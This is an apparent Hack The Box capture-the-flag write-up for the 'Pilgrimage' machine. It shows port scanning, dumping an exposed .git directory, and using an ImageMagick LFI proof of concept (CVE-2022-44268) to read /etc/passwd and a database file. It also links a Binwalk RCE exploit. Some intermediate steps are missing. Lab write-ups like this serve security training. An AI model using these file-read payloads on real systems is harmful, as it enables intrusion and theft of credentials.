# Pilgrimage

This is the write-up for Pilgrimage machine from Hack The Box.

# Reconnaissance

First, we execute a full port scan on the machine.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/pilgrimage]
└──╼ [★]$ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.219

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Now, we execute a port scan just on the open ports.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/pilgrimage]
└──╼ [★]$ sudo nmap -vv -sC -sV -p 22,80 -oA nmap/pilgrimage 10.10.11.219

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
| ssh-rsa 
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d14e293c708669b4d72cc80b486e9804 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see, we have to write the domain name in our /etc/hosts file.

![Untitled](images/Untitled.png)

Now we access the web page from the host.

![Untitled](images/Untitled%201.png)

# Enumeration

We execute a brute-force directory attack on the root of the web page.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/pilgrimage]
└──╼ [★]$ gobuster dir -e -u "http://pilgrimage.htb/" -w "/opt/SecLists/Discovery/Web-Content/quickhits.txt" -t 40 -o gobuster/pilgrimage_root_quickhits

http://pilgrimage.htb//.git/index          (Status: 200) [Size: 3768]
http://pilgrimage.htb//.git                (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/]
http://pilgrimage.htb//.git/config         (Status: 200) [Size: 92]
http://pilgrimage.htb//.git/HEAD           (Status: 200) [Size: 23]
http://pilgrimage.htb//.git/logs/refs      (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/logs/refs/]
http://pilgrimage.htb//.git/logs/HEAD      (Status: 200) [Size: 195]
http://pilgrimage.htb//login.php           (Status: 200) [Size: 6166]
http://pilgrimage.htb//register.php        (Status: 200) [Size: 6173]
http://pilgrimage.htb//tmp                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
```

We have a .git directory exposed on the root of the web application. Using the git-dumper tools, we got the source-code of the application.

![Untitled](images/Untitled%202.png)

![Untitled](images/Untitled%203.png)

As we can see, there is a binary file called magick in the git repository. Checking the version of it, we got.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/gitdumper]
└──╼ [★]$ file magick 
magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped

─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/gitdumper]
└──╼ [★]$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

We noticed that the ImageMagick running on the web app is the 7.1.0-49 beta version. Searching for a public exploit for it, we got.

[https://github.com/Sybil-Scan/imagemagick-lfi-poc](https://github.com/Sybil-Scan/imagemagick-lfi-poc)

# Exploitation

Running the exploit, we generate our payload in order to upload it to the vulnerable web application.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/exploitation]
└──╼ [★]$ python3 generate.py -f "/etc/passwd" -o etcpasswd.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > etcpasswd.png
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/exploitation]
└──╼ [★]$ ls
CVE-2022-44268-master  etcpasswd.png  generate.py
```

Now, we upload the generated PNG file to the web application.

![Untitled](images/Untitled%204.png)

We copy the link generated from the web application and download the image.

└──╼ [★]$ wget http://pilgrimage.htb/shrunk/649e0302e9183.png

We remove all the brake lines from the file.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/exploitation]
└──╼ [★]$ tr --delete "\n" < out.txt > out1.txt
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/exploitation]
└──╼ [★]$ cat out1.txt 

```

We were able to retrieve the `/etc/passwd` file from the web server. We noticed there is a user called emily.

Checking back to the source code that we got from the git repository, we identify the database file in index.php file.

![Untitled](images/Untitled%206.png)

We pass this file in our malicious PNG file in order to retrieve it.

```bash
─[us-free-2]─[10.10.14.152]─[th3g3ntl3m4n@parrot]─[~/htb/seasonals/images/exploitation]
└──╼ [★]$ python3 generate.py -f "/var/db/pilgrimage" -o db.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > db.png
```

Upload the db.png file.

We check the binwalk version and noticed there is a vulnerability on it.

```bash
emily@pilgrimage:/tmp$ /usr/local/bin/binwalk                                                                                                                                                 
                                                                                                                                                                                              
Binwalk v2.3.2                                                                                                                                                                                
Craig Heffner, ReFirmLabs                                                                                                                                                                     
https://github.com/ReFirmLabs/binwalk                                                                                                                                                         
                                                                                                                                                                                              
Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
```

[Binwalk v2.3.2 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/51249)

Chacking this file, we see that it is running the binwalk binary

```bash
emily@pilgrimage:/tmp$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```
